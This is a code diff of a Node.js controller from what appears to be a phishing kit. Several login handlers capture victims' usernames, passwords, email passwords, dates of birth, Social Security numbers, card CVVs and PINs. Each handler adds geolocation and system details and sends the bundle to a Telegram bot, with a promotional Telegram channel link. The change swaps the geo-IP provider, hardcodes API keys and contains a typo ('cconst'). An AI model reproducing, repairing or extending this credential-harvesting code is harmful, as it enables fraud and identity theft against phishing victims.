@@ -2,9 +2,10 @@ const { sendMessageFor } = require("simple-telegram-message");
 const ipInfo = require("ip-info-finder");
 const { getClientIp } = require("request-ip");
 const { botToken, chatId } = require("../config/settings");
-const axios = require('axios');
-const abstractApiKey = '72afc8e739e6478d9202565f05968721';
-const URL = `https://ipgeolocation.abstractapi.com/v1/?api_key=${abstractApiKey}&ip_address=`;
+cconst axios = require('axios');
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
+
 
 
 
@@ -38,14 +39,14 @@ exports.loginPost = async (req, res) => {
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-        `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-        `COORDINATES      : ${ipAddressInformation.longitude}, ${ipAddressInformation.latitude}\n` +  // Fix variable names
-        `CITY             : ${ipAddressInformation.city}\n` +
-        `STATE            : ${ipAddressInformation.region}\n` +
-        `ZIP CODE         : ${ipAddressInformation.postal_code}\n` +
-        `COUNTRY          : ${ipAddressInformation.country}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
-		`ISP              : ${ipAddressInformation.connection.isp_name}\n\n` +
+		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
         `💻 SYSTEM INFO\n` +
         `USER AGENT       : ${userAgent}\n` +
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
@@ -102,8 +103,8 @@ exports.loginPost2 = async (req, res) => {
 			`PASSWORD         : ${password}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+			`IP ADDRESS       : ${ipAddress}\n` +
+			`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
@@ -151,8 +152,8 @@ exports.loginPost3 = async (req, res) => {
 			`EMAIL PASSWORD   : ${emailPass}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-            `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+			`IP ADDRESS       : ${ipAddress}\n` +
+			`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
@@ -204,8 +205,8 @@ exports.loginPost4 = async (req, res) => {
 		`DOB              : ${dob}\n` +
 		`SSN              : ${ssn}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		 `IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-		 `TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+		`IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
 		 `💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
@@ -254,8 +255,8 @@ exports.loginPost5 = async (req, res) => {
 		`CVV              : ${cvv}\n` +
 		`CARD PIN         : ${cpin}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddressInformation.ip_address}\n` +
-		`TIME             : ${ipAddressInformation.timezone.current_time}\n` +
+		`IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 
